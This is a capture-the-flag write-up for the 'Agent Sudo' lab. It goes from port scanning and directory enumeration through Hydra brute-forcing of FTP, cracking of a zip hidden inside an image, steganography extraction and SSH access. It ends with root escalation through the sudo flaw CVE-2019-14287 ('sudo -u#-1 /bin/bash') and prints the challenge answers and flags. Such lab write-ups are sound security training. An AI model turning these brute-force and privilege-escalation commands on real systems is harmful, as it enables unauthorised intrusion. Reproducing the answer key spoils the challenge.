# Agent Sudo
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

```
ip = 10.10.5.128
```

## Nmap

```
nmap -sC -sV -oN initial.log 10.10.5.128
```

>21/tcp open  ftp     vsftpd 3.0.3
>
>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
>
>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

## Task 1.

Accessing to the website I find the following text:

>Dear agents,
>
>Use your own **codename** as user-agent to access the site.
>
>From,
>Agent R 


```
nikto -h http://10.10.5.128 | tee nikto.log
```

Using **gobuster** I'm going to scan `http://10.10.5.128 /` for hidden directories or files using a wordlist and checks specified file extensions like php or txt.

```
gobuster dir -u http://10.10.5.128 / -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,sh,cgi,html,css,js,py
```

With the information found on the web I am going to try to access webpages using curl and passing the header `User-Agent`. After trying some I obtain:

```
curl "http://10.10.5.128/" -H "User-Agent: C" -L

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

```


### Questions.

1. How many open ports?

    >3

2. How you redirect yourself to a secret page?

    >User-Agent

3. What is the agent name?

    >chris


## Task 2.

### Questions.

Knowing the name of the agent and assuming he didn't change the password, I am goin to try to perform a Brute-Force attack with Hydra:

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.5.128

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-03 10:37:11
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.5.128:21/
[21][ftp] host: 10.10.5.128   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-03 10:38:22
```

After accesing via ftp with the credentials found I obtain three files (To_agentJ.txt, cutie.png and cute-alien.jpg) using:

```
mget *
```

In the text is said that a agent password is stored in the images. So, I am going to use `string` on the images to find something:

```
strings cutie.png

...

IEND
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

It seems there are files, so, I am going `binwalk` to be sure:

```
binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

There is a ZIP file in the image, so, I am going to obtain it.

```
cd _cutie.png.extracted/
ls -al

drwxrwxr-x 2 vfg27 vfg27   4096 Dec  3 11:10 .
drwxrwxr-x 4 vfg27 vfg27   4096 Dec  3 11:06 ..
-rw-rw-r-- 1 vfg27 vfg27 279312 Dec  3 11:03 365
-rw-rw-r-- 1 vfg27 vfg27  33973 Dec  3 11:03 365.zlib
-rw-rw-r-- 1 vfg27 vfg27    280 Dec  3 11:03 8702.zip
-rw-rw-r-- 1 vfg27 vfg27      0 Dec  3 11:10 To_agentR.txt
```

If I try to extract it, it asks for a password. In order to obtain the password I am going to use `JohnTheRipper`.

```
snap/john-the-ripper/current/run/zip2john > hashes_for_john.txt

snap/john-the-ripper/current/run/john hashes_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt

...

alien            (8702.zip/To_agentR.txt) 
```

Using the password obtained I obtain the contents of the ZIP file (To_agentR.txt):

>Agent C,
>
>We need to send the picture to 'QXJlYTUx' as soon as possible!
>
>By,
>Agent R

`QXJlYTUx` is a base64 encoded word. The decoded version is `Area51`.

Next, I am going to check if there is some steg info hidden in the other picture, using as passphrase `Area51`.

```
steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```

In the message extracted I find a new agent and password, so, I  try to access its user using ftp and ssh.

1. FTP password
    >crystal
2. Zip file password
    >alien
3. steg password
    >Area51
4. Who is the other agent (in full name)?
    >james
5. SSH password
    >hackerrules!

## Task 3.

### Questions.

Using ssh I manage too enter james machine. There are two files that I  transfer to my computer using `scp`.

1. What is the user flag?
    >b03d975e8c92a7c04146cfa7a5a313c7
2. What is the incident of the photo called?
    >Roswell alien autopsy
## Task 4.

In order to find how to escalate privileges I am going to use `linpeas`. Looking at the sudo version I see I can gain sudo access by typing:

```
sudo -u#-1 /bin/bash
```
Going to `/root` folder I find the last file needed.

### Questions.

1. CVE number for the escalation 
    >CVE-2019-14287
2. What is the root flag?
    >b53a02f55b57d4439e3341834d70c062
3. (Bonus) Who is Agent R?
    >DesKel
